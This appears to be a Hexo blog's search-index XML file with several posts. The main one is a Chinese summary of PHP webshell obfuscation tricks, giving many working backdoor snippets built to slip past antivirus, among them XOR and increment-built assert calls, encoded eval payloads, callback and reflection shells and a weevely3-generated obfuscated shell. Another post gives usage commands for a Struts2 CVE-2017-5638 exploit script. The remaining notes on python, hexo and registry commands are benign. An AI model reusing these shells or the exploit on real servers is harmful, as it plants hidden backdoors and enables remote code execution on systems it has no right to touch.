<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title></title>
      <url>/2017/12/08/PHP%20WebShell%E5%8F%98%E5%BD%A2%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<hr>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>WebShell的变形技术与各种防护软件的检测方法一直都在相互对抗，本篇文章就对目前常见的<span style="font-size: 16px;">WebShell</span>的变形技术进行总结。</strong></p>
<p>目前的防护软件对能够执行命令函数和能够执行代码的函数都会格外的敏感，如<code>eavl</code>、<code>assert</code>、<code>system</code>、<code>popen</code>、<code>shell_exec</code>，所以像最为简单的<code>eval($_POST[cmd])</code>的一句话就一定会被查杀。所以目前的变形的本质都在于如何隐藏自己的敏感函数。</p>
<h2 id="巧用-GPC"><a href="#巧用-GPC" class="headerlink" title="巧用$GPC"></a>巧用$GPC</h2><h3 id="利用-GLOBALS"><a href="#利用-GLOBALS" class="headerlink" title="利用$GLOBALS"></a>利用$GLOBALS</h3><pre><code>@eval($GLOBALS[&apos;_POST&apos;][&apos;op&apos;]);
`&lt;/pre&gt;

很多的防护软件仅仅只是检查`$_POST`，所以通过`$GLOBALS`就能够逃过查杀。

### 利用$_FILE

&lt;pre&gt;`@eval($_FILE[&apos;name&apos;]);
`&lt;/pre&gt;

使用`$_FILE`就能够逃脱很多防护软件了。

## 关键字替换

### 敏感函数拆分

由于PHP语法的灵活性，这种写法就会有很多了。比如

&lt;pre&gt;`$k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} [&apos;sz&apos;]);
`&lt;/pre&gt;

这种就是利用PHP的可变函数来拆分`assert`关键字。但是这种拆分方式也比较的简单，目前的防护软件已经可以识别了。

这种方式也可以变形一下，将`assert`放置在函数里面。如下：

&lt;pre&gt;`function func() {
    return &quot;ass&quot;.&quot;ert&quot;;
}
$a = func();
$a(${&quot;_PO&quot;.&quot;ST&quot;}[&apos;sz&apos;]);
`&lt;/pre&gt;

基于这种方式还可以进行更多的变形，在这里就不进行说明了。

### 空格替换&amp;amp;字符串替换

&lt;pre&gt;`&amp;lt;?php $b=strrev(&quot;edoced_4&quot;.&quot;6esab&quot;);eval($b(str_replace(&quot; &quot;,&quot;&quot;,&quot;a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = &quot;)));?&amp;gt;
`&lt;/pre&gt;

首先将关键函数进行倒转和空格，之后利用`strrev`和`str_replace`恢复。不同于之前的字符串拼接，这种方式采用的是将字符串进行各种变形达到隐藏敏感函数的目的，这种方式在一定程度上能够有效地躲避查杀。

## 特殊字符

这种特殊字符组成的webshell其实也算是**关键字替换**中的，但是这种由特殊字符串组成的webshell经常被讨论，所以在这里单独作为一小节进行说明。

### 进制运算

&lt;pre&gt;`@$_++;

$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);         // $__的值为_POST

@${$__}[!$_](${$__}[$_]);
`&lt;/pre&gt;

通过异或运算(`^`)、取反运算(`!`)的方式组成一个webshell。

### 自增运算

因为在PHP中，`&apos;a&apos;++ =&amp;gt; &apos;b&apos;`，`&apos;b&apos;++ =&amp;gt; &apos;c&apos;`,所以我们如果得到了其中的一个字母，通过这个字符就可以得到所有的字母。通过`$_=[];$_=@&quot;$_&quot;;;`得到`$_`为`Array`的字符串，那么就可以得到所有的字符串了。

&lt;pre&gt;`$_=[];
$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;
$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
$____=&apos;_&apos;;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___(base64_decode($_[_])); // ASSERT($_POST[_]);
`&lt;/pre&gt;

关于这种由特殊字符组成的webshell可以参考P神写的[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

### 利用注释

&lt;pre&gt;`@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;
@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;
@$_/*-/*-*/($/*-/*-*/{&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;}
[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // 密码-7
`&lt;/pre&gt;

通过特色符号和注释组合组成一个webshell，也能够隐藏关键字。

## 异或运算&amp;amp;字符编码

这种异或运算得到的webshell与上面讲的通过异或运算不完全一样。在特定的编码情况下，一些字符串经过异或运算就能够得到一些特定的函数，这些函数就可以用于构造webshell。

&lt;pre&gt;`$y=~督耽孩^&apos;(1987)&apos;;
$y($_POST[1987]);
`&lt;/pre&gt;

上述的代码需要以`GBK`的方式保存,其中的`$y`的值为`assert`，这样就是一个典型的webshell了。

还有如下这种：

&lt;pre&gt;`$x=~Ÿ¬¬º­«;
$x($_POST[~¹¹ÏÏÏÏ]);
`&lt;/pre&gt;

上述的代码需要以`ISO-8859-15`保存，其中的`$x`为`assert`,而`~¹¹ÏÏÏÏ`是`FF0000`。即使是这种方式，部分的防护软件还是能够识别。

## eval&amp;amp;base64_decode变形

通过对大量的webshell分析，发现很多的webshell其实都是`eval(base64_decode($_POST[cmd]))`这种方式的变形。变形的核心思想其实就是将`base64_decode`、`$_POST`隐藏。下面就对这几种变形的方法进行说明。

### 字符串&amp;amp;数组的方式

这种方式一般都是先声明字符串，之后通过从字符串中进行取值，得到所需要的敏感函数。如下：

&lt;pre&gt;`$sF = &quot;PCT4BA6ODSE_&quot;;
$s21 = strtolower($sF[4] . $sF[5] . $sF[9] . $sF[10] . $sF[6] . $sF[3] . $sF[11] . $sF[8] . $sF[10] . $sF[1] . $sF[7] . $sF[8] . $sF[10]);
$s22 = ${strtoupper($sF[11] . $sF[0] . $sF[7] . $sF[9] . $sF[2])}[&apos;n985de9&apos;];
if (isset($s22)) {
    eval($s21($s22));
}
`&lt;/pre&gt;

通过字符串`PCT4BA6ODSE_`得到,`$s21`为`base64_decode`,`$s22`为`${&quot;_POST&quot;}[&apos;n985de9&apos;]`,所以这种方式最后的代码其实就是`eval(base64_decode($_POST[&apos;n985de9&apos;]));`

### 进制转换

这种方式在webshell中也是比较常见的。

&lt;pre&gt;`$v230c590=&quot;\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145&quot;;
@eval($v230c590(.....
`&lt;/pre&gt;

其中`$v230c590`就是`base64_decode`，通过十六进制和八进制混用的方式代替`base64_decode`。还有如下这种形式

&lt;pre&gt;`$liner = &quot;pr&quot;.&quot;e&quot;.&quot;g_&quot;.&quot;re&quot;.&quot;p&quot;.&quot;l&quot;.&quot;ace&quot;;
$liner(&quot;/.*/e&quot;,&quot;\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28&quot;,php_code);
`&lt;/pre&gt;

其中`\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28`其实为`eval(gzuncompress(base64_decode(`也达到了隐藏敏感函数的目的。

## 反序列化执行

通过序列化的方式，我们也能够执行webshell。

&lt;pre&gt;`class foo{
    public $data=&quot;text&quot;;
    function __destruct()
    {
        eval($this-&amp;gt;data);
    }
}
$file_name=$_GET[&apos;id&apos;];
unserialize($file_name);
`&lt;/pre&gt;

我们需要在本地构造序列化的数据。构造好了之后，通过`shell.php?id=id=O:3:&quot;foo&quot;:1:{s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;}`，这样就能够执行`phpinfo();`命令了。

## 回调函数

PHP中的回调函数非常之多，所以通过回调函数执行Webshell的方式也非常的多。最常见的回调函数的写法就是`$ant=create_function(&quot;&quot;,&quot;eval($_POST[cmd]);&quot;);$ant();`。但是目前大部分的防护软件都都已经能够识别这种写法的webshell，所以目前的回调函数方法变形一般都是通过其他的不常见的回调函数以及变换关键代码。

### create_function的变形

基于create_function的变形是非常多的。如下面两种：

变形一：

&lt;pre&gt;`$function = create_function(&apos;$code&apos;,strrev(&apos;lave&apos;).&apos;(&apos;.strrev(&apos;TEG_$&apos;).&apos;[&quot;code&quot;]);&apos;);$function();
`&lt;/pre&gt;

变形二：

&lt;pre&gt;`$function = create_function(&apos;$code&apos;,base64_decode(&apos;ZXZhbCgkX0dFVFsidGVzdCJdKTs=&apos;));
$function();
`&lt;/pre&gt;

总体来说这种方法和上面讲的**关键字替换**是类似的

### preg_replace变形

通过`preg_replace`的`\e`模式下能够执行代码这种方式也是十分常见的，很多攻击者都喜欢使用`preg_replace`。下面就提供三种变形。

变形一：

&lt;pre&gt;`@$a = $_POST[&apos;x&apos;];
if (isset($a)) {
    @preg_replace(&quot;/\[(.*)\]/e&quot;, &apos;\\1&apos;, base64_decode(&apos;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&apos;));
}
`&lt;/pre&gt;

通过base64编码将关键代码隐藏。

变形二：

&lt;pre&gt;`function funfunc($str) {}
echo preg_replace(&quot;/&amp;lt;title&amp;gt;(.+?)&amp;lt;\/title&amp;gt;/ies&quot;, &apos;funfunc(&quot;\1&quot;)&apos;, $_POST[&quot;cmd&quot;]);
`&lt;/pre&gt;

这种方式其实还利用了PHP中的可变变量能够执行代码的特点。通过`cmd=&amp;lt;title&amp;gt;${@eval($_POST[xxx])}&amp;lt;/title&amp;gt;&amp;amp;xxx=phpinfo();`这种方式就可以执行任意的代码了。

变形三：

在php中也有几个和preg_replace类似的函数可以使用，如`mb_ereg_replace`、`preg_filter`。用法如下：

&lt;pre&gt;`mb_ereg_replace(&apos;.*&apos;, $_REQUEST[&apos;pass&apos;], &apos;&apos;, &apos;e&apos;);
echo preg_filter(&apos;|.*|e&apos;, $_REQUEST[&apos;pass&apos;], &apos;&apos;);
`&lt;/pre&gt;

在PHP中这种动态函数是非常多的，除了上述说的`create_function`,`preg_replace`，还有诸如`call_user_func`、 `call_user_func_array`。还可以利用一些不常见的回调函数，如`array_map`、`array_filter`、`array_reduce`、`array_udiff`这种方式，还有很多其他的回调函数可供使用。P神也写过一篇关于用回调函数构造webshell的文章，    [创造tips的秘籍——PHP回调后门](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)。

### 动态函数执行

&lt;pre&gt;`$dyn_func = $_GET[&apos;dyn_func&apos;];
$argument = $_GET[&apos;argument&apos;];
$dyn_func($argument);
`&lt;/pre&gt;

这种动态函数的变形目前已经被广泛地使用，目前大部分的防护软件都能够识别。

## 利用文件名&amp;amp;注释

一般情况下，防护软件在检测Webshell时一般都会忽略掉文件名和文件中的注释，那么我们就可以在文件名和注释中放入敏感函数。

### 巧用文件名

`no_assert.php`

&lt;pre&gt;`&amp;lt;?php
${&quot;function&quot;}=substr(__FILE__,-10,-4);;
${&quot;command&quot;}=$_POST[cmd];
$function($command);
`&lt;/pre&gt;

这种，得到的`$function`就是`assert`，这样就形成了`assert($_POST[cmd]);`的后门。

`$_POST[cmd].php`

&lt;pre&gt;`&amp;lt;?php
${&quot;function&quot;}= substr(__FILE__, -15, -4);
${&quot;config&quot;} = assert;
$config($function);
`&lt;/pre&gt;

这个是将`$_POST[cmd]`放置在文件名中进行隐藏，同样可以达到隐藏的目的。

## 自定义函数

为了能够逃避防护软件的查杀，很多webshell都会自己编写加密函数或者是字符串转换函数。下面就几个函数进行说明。

### 十六进制执行

&lt;pre&gt;`$string=&apos;&apos;;
$password=&apos;test&apos;;
if(isset($_POST[$password])){
    $hex=$_POST[$password];
    for($i=0;$i&amp;lt;strlen($hex)-1;$i+=2){
    $string.=chr(hexdec($hex[$i].$hex[$i+1]));
}
@eval($string);
`&lt;/pre&gt;

只需要将传入的指令变为16进制的字符串即可。`shell.php?test=706870696e666f28293b`。其中的`706870696e666f28293b`就是`phpinfo();`的十六进制，用法和普通的webshell没有区别。

## 自定义加密

&lt;pre&gt;`function decode($string) {
    $result = &apos;&apos;;
    for($index=0;$index&amp;lt;strlen($string);$index += 1) {
        $result .= chr(ord($string[$index])-3);
    }
    return $result;
}
$b = create_function(&apos;&apos;,decode(&quot;Chydo+&apos;bSRVW^fpg`,&amp;gt;&quot;));
$b();
`&lt;/pre&gt;

这个加密函数十分的简单，仅仅是将字母的ascii值减3而已，算是比较简单的加密算法。

&lt;pre&gt;`decode(&quot;Chydo+&apos;bSRVW^fpg`,&amp;gt;&quot;)
`&lt;/pre&gt;

得到就是`@eval($_POST[cmd]);`。

## 反射技术

&lt;pre&gt;`$func = new ReflectionFunction($_GET[m]);
echo $func-&amp;gt;invokeArgs(array($_GET[c]));
`&lt;/pre&gt;

这种方式调用起来也非常的简单`xx.com/shell.php?m=assert&amp;amp;c=phpinfo();`和动态函数执行的方式十分的相似。但是目前这种方式已经被各种安全防护软件识别了。

## 文件加密

加密的方式就非常多了，包括使用开源的webshell工具或者是网上在线的加密方法或者是自己编写加密代码进行混淆加密。

### 混淆加密

&lt;pre&gt;`$M_=&apos;TcynUS2Dj&apos;|Xtt1C5;$xPAsA3=&apos;|L#K1)&apos;^&apos;=`&apos;.tosl;$ps6U8r2u=&apos;S R&apos;|&apos;Z @&apos;;&apos;F_fTJ4U3M&apos;.
    &apos;)u(&amp;lt;I9&apos;;$ots8zM7=wwugn.&apos;~&apos;&amp;amp;outg.&quot;~~&quot;;$CqHZRjrpv=&apos;om~}ov&apos;&amp;amp;&apos;owv}~w&apos;;$pmak=/*OYR&apos;.
    &apos;HF]mwSAu~*/oZD5t.&apos;-&apos;.TouvRdijg|&apos;M at~`K*$jqr!-)&apos;;$Nkm4DL=wwoiuw_o.#jDj9F8qWCU&apos;.
    &apos;}og~oo~&apos;&amp;amp;ssoyww_vw.&apos;~&apos;.wtoo.&apos;~&apos;;$sSZ1ZTtXOI=&apos;J~DQ}e&apos;&amp;amp;iUTZ.&apos;]C&apos;;$enZB=&apos;wfq/Wc&amp;lt;&apos;.
    &apos;.g!17}x`1qs@#1g)=a=79&apos;.mc56&amp;amp;&quot;!|7&quot;.aLxt2a.&quot;{y#93V7;;C;~m uO3;q;{v2&quot;;&apos;gyxK39Xu1&apos;.
    &apos;:i^&apos;;$woW8PBSb_J=&apos;?g~v$z~a,w&apos;&amp;amp;&apos;vo?.us|{4k&apos;;$hefSTat73=&apos;ko7|;uw?&apos;&amp;amp;&apos;S}w?&apos;./*Usx&apos;.
    &apos;&amp;gt;XUb.*/wuuo;$H31KYF=&apos;-(Y%;L8@&apos;|&apos;-(|lz@2f&apos;;$oRzY9cesWL=BrvDsY^&apos;cS=p2;&apos;;&apos;djCAxk&apos;.
    &apos;zX~lO=:nK5&apos;;$jKRFmGwxTPb=&apos;sl[GUs&apos;^&apos;6(#%~)&apos;;$cQZ75FbYVQT=&apos;:(&amp;amp;.&apos;.Z5qdh^/*KudDMp&apos;.
    &apos;LtxJEC*/bkcTlp7.&apos;$)&apos;;$ZNh7cpA=J^&apos;+&apos;;$VRcphf2Y1=&apos;+&apos;|K;$fXLKDzG=&apos;(C&apos;^&apos;M;&apos;;&apos;dHaM&apos;.
    &apos;]9|ds5tbb&apos;;$I5Hmeo7gVJ=E^&quot;,&quot;;$mwo7=w&amp;amp;t;$TvUYRhtThs=&quot;^&quot;.TVW_.&quot;|_]&quot;.u__CURu./*j&apos;.
    &apos;l*/&quot;{H&quot;&amp;amp;&quot;Iv|&quot;.x_Z_UZ_wyRq_Wz;$ypaVtIfRO=&apos;]&apos;.SEBTRE|WPEAUR.&apos;@&apos;;$TegpU9P5=(&apos;3Zw&apos;.
    &apos;g/5&apos;&amp;amp;&apos;zx-G/w&apos;)^$xPAsA3;$rM36yFVDxOo=(&apos;$Df&apos;|&apos;6Dc&apos;)^$ps6U8r2u;$iG7yrwzXUiW=/*cL&apos;.
    &apos;srxQMMk*/$ots8zM7&amp;amp;$CqHZRjrpv;$qioLnlc=(&apos;7w,c/&quot;YQ#a`p&apos;^&apos;i@c-&apos;.IeimeU48)^(&apos;,E&quot;!&apos;.
    &apos;!!TH(E&quot;,&apos;|&apos;.D()95EL*T5-&apos;);$Pl=$pmak&amp;amp;$Nkm4DL;$rF0oYXqV9=(&apos;HDP@O@&apos;|&apos;HDD@F@&apos;)|/*&apos;.
    &apos;f*/$sSZ1ZTtXOI;$hLZSKz9=(&quot;||=6&quot;.tB5s.&quot;#;(7i}%-d2|&quot;.r6O67a.&quot;!h-:j0&amp;amp;&quot;&amp;amp;&apos;4&amp;amp;2=)f5;&apos;.
    &apos;%}ev:2%9*5&apos;.ebteyl.&apos;,g61&amp;lt;E#s&apos;)|$enZB;$Z61ppy=$ZNh7cpA&amp;amp;$VRcphf2Y1;$ZHU=/*fE9Yr&apos;.
    &apos;7q?{!W*/$woW8PBSb_J&amp;amp;(&apos;?&apos;.qldtjo.&apos;&amp;lt;/w&apos;&amp;amp;&apos;-&apos;.snkdo.&apos;?yoo&apos;);$PhcCKxq=/*XeLXi26ULV&apos;.
    &apos;pri*/$hefSTat73^$H31KYF;$emJm_U=$oRzY9cesWL^$jKRFmGwxTPb;$FTGoqvnK=/*a5xj88EI&apos;.
    &apos;n(am7*/$cQZ75FbYVQT|(&apos;5;]+`&apos;.lexH^&apos;}k8{DLK:-&apos;);if($TegpU9P5($rM36yFVDxOo(/*TA&apos;.
    &apos;(^q.4;*/$iG7yrwzXUiW($rF0oYXqV9)),$hLZSKz9))$qioLnlc((&apos;{/Z_&apos;^&apos;TNu:&apos;),/*qwCzim&apos;.
    &apos;JQ7+5)JTBF*/$fXLKDzG.$I5Hmeo7gVJ.$mwo7,$Z61ppy);$yX4gTiSd=$Pl($ZHU,/*BtAiX0w8&apos;.
    &apos;7*LALb~*/$iG7yrwzXUiW($TvUYRhtThs.$ypaVtIfRO));$yX4gTiSd($PhcCKxq,$emJm_U,/*p&apos;.
    &apos;}R*/$FTGoqvnK);#T)s&amp;lt;k?vZ%Nx[VsvNLg&amp;lt;sQ8KlP!D{*nm306rhxT95kZ5CMe=YJ*V3cTstah.t&apos;.
    &apos;HD PDe:F{4#Wplm 1BLh0FD7*@?;aZJQnFF1$zR&apos;;
`&lt;/pre&gt;

以上就是一个自定义被加密的webshell，主要是利用了各种位运算符达到混淆加密的目的。

### 使用加密工具加密

国内的工具还是有很多的，包括phpjm，phpjiami通过测试,即使是最为简单的`@eval($_POST[cmd])`，经过加密之后还是很多防护软件无法识别出webshell。

### Weevely

weevely是一款使用python编写的webshell工具，[Github地址](https://github.com/epinna/weevely3)下面就是`weevely3`生成的朴php 代码：

&lt;pre&gt;`$L=&apos;O=$_SERVE9OR;$rr9O=@$r[&quot;H9OTTP_9OREFERER9O&quot;];$ra=9O@$r[&quot;H9OTT9OP_9O9OACCEPT_LANGUAGE&quot;]9O;if($9O9Orr&amp;amp;&amp;amp;$ra&apos;;
$b=&apos;art();@ev9Oal(@9Ogzu9Oncompres9Os(@x(9O@base69O4_decode(9Opre9Og_repla9O9Oce9O(arra9Oy(&quot;/_/&quot;,&quot;/-/&quot;),a&apos;;
$h=&apos;$z+9O+)$p.9O=$q[$m[2][9O$z]];if(strpos(9O$p,9O$9Oh)===09O){$s[$i]=&quot;&quot;9O;$p=$ss(9O9O$p,3);}if9O(array_k&apos;;
$P=&apos;ey9O_exi9Osts($i,9O$s))9O{$s[$i]9O.9O=$p;$e=strp9Oo9Os($s[9O$i],$f);if($9Oe){$9Ok=$kh.$kf;9Oo9Ob_s9Ot&apos;;
$y=&apos;($i.$kh),0,39O));9O$f=$9Osl($ss(m9Od5($i9O.$kf),9O0,39O));$p=&quot;&quot;;for(9O$z9O=1;9O$9Oz&amp;lt;9Ocount($m[1])9O;&apos;;
$z=&apos;rray(&quot;/&quot;9O,&quot;9O+&quot;9O),$9Oss($s[$i],0,$e))9O),9O$9Ok)));$o=9Oob_get_content9Os();9Oob_en9Od_clean()9O9O;$d=ba&apos;;
$r=&apos;$kh=&quot;dff9Of&quot;9O;$9Okf=9O&quot;09Oa7f&quot;;function x($t,$k9O)9O{$c=9Ostrlen($k9O)9O;$l9O=strlen($t);$9Oo=&quot;&quot;;for9O($i&apos;;
$G=&apos;){$u=p9Oar9Ose_url9O($rr9O);parse_str9O($u[&quot;query9O9O&quot;],$q);$9Oq=array_v9O9Oalues(9O$q);preg9O_match_a9O&apos;;
$T=str_replace(&apos;Ul&apos;,&apos;&apos;,&apos;crUleUlate_UlfUluUlnUlction&apos;);
$v=&apos;=9O0;$i&amp;lt;$l;){fo9Or($j=09O;($j&amp;lt;$c9O&amp;amp;9O&amp;amp;$i&amp;lt;$l9O);$j++,$i++9O){$o9O.9O=$t{$i}^9O$k{$j};}}9Oreturn 9O$o;}$r9&apos;;
$Q=&apos;se9O64_encode9O(x(gz9Ocompres9Os($o),$9Ok));pr9Oint(9O9O&quot;&amp;lt;$k&amp;gt;$d&amp;lt;/$9Ok&amp;gt;&quot;);@sess9Oi9Oon_de9Ostroy();}}}}&apos;;
$k=&apos;=&amp;amp;$_SES9OSION9O;9O$ss=&quot;su9Obstr&quot;9O;$sl=&quot;strtol9Oower&quot;;$i9O9O9O=$m[1][0].$m[19O][1];$h=$sl9O($9Oss(m9Od5&apos;;
$o=&apos;ll(&quot;/9O([\\w])[\\w9O-]9O+(?:;9Oq=09O.([\\d9O]))?,?/&quot;,9O$ra,9O$m);if($q9O&amp;amp;&amp;amp;9O$m){@sessio9On_sta9Ort();$9Os&apos;;
$t=str_replace(&apos;9O&apos;,&apos;&apos;,$r.$v.$L.$G.$o.$k.$y.$h.$P.$b.$z.$Q);
$C=$T(&apos;&apos;,$t);$C();
`&lt;/pre&gt;

看起来完全是毫无意义的代码。但是即使是这样，D盾还是能够识别。

## 总结

本篇文章对目前PHP中的常见的webshell变形技术进行了总结归纳，可以发现这些变形技术都大量地使用了PHP的语言特性。由于PHP的灵活的语法以及大量的内置函数，导致webshell可以有各种各样的变形技术。多样的变形技术不仅可以让攻击者写出更加隐蔽的webshell，也增加了防护软件识别的难度。webshell的变形技术就在攻击者与防护软件的对抗中也不断的演变和升级。本篇文章也只是对于总结了各种防护方法，关于其中的变形原理就不进行详细地说明了。

## 彩蛋

&lt;pre&gt;`    /**
    * eva
    * l($_GE
    * T[&quot;c&quot;]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass(&apos;TestClass&apos;);
    $str = $rc-&amp;gt;getDocComment();
    $evf=substr($str,strpos($str,&apos;e&apos;),3);
    $evf=$evf.substr($str,strpos($str,&apos;l&apos;),6);
    $evf=$evf.substr($str,strpos($str,&apos;T&apos;),8);
    $fu=substr($str,strpos($str,&apos;as&apos;),4);
    $fu=$fu.substr($str,strpos($str,&apos;r&apos;),2);
    $fu($evf);
</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><a href="http://blog.safedog.cn/?p=68" target="_blank" rel="noopener">http://blog.safedog.cn/?p=68</a></p>
<p><a href="https://joychou.org/web/webshell.html" target="_blank" rel="noopener">https://joychou.org/web/webshell.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[s2-045 exp CVE-2017-5638]]></title>
      <url>/2017/03/16/s2-045-exp-CVE-2017-5638/</url>
      <content type="html"><![CDATA[<p>Usage:</p>
<p>Testing a single URL.</p>
<pre><code>python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos;
</code></pre><p>Testing a list of URLs.</p>
<pre><code>python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos;
</code></pre><p>Checking if the vulnerability exists against a single URL.</p>
<pre><code>python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos;
</code></pre><p>Checking if the vulnerability exists against a list of URLs.</p>
<pre><code>python struts-pwn.py --check --list &apos;urls.txt&apos;
</code></pre><p>Requirements</p>
<pre><code>Python2 or Python3
requests
</code></pre><p><a href="https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py" title="s2-045" target="_blank" rel="noopener">https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py</a></p>
]]></content>
      
        <categories>
            
            <category> exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> s2-045 </tag>
            
            <tag> exp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python command]]></title>
      <url>/2017/03/06/Python-command/</url>
      <content type="html"><![CDATA[<p>python:</p>
<pre><code>py -2 hello.py

py -3 hello.py
</code></pre><p>pip</p>
<pre><code>py -2 -m pip install XXXX

py -3 -m pip install XXXX
</code></pre>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SimpleHTTPServer]]></title>
      <url>/2017/03/05/SimpleHTTPServer/</url>
      <content type="html"><![CDATA[<pre><code>python -m SimpleHTTPServer 8080 #端口可自定义
</code></pre>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> command </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[win10-Cmd here]]></title>
      <url>/2017/03/04/win10-Cmd-here/</url>
      <content type="html"><![CDATA[<p>保存为reg格式导入注册表即可：</p>
<pre><code>Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here]
@=&quot;Cmd Here&quot;

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command]
@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt]
@=&quot;Cmd Here&quot;

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command]
@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot;

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here]
@=&quot;Cmd Here&quot;

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command]
@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;
</code></pre><p><img src="http://i.imgur.com/wZijEcJ.jpg" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> cmd </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo command]]></title>
      <url>/2017/03/02/hexo-command/</url>
      <content type="html"><![CDATA[<pre><code>hexo new &quot;postName&quot; #新建文章
hexo new page &quot;pageName&quot; #新建页面
hexo generate #生成静态页面至public目录
hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）
hexo deploy #将.deploy目录部署到GitHub
</code></pre><hr>
<pre><code>hexo clean
hexo generate --deploy
</code></pre>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mimikittenz-Ps1版]]></title>
      <url>/2017/03/01/mimikittenz-Ps1%E7%89%88/</url>
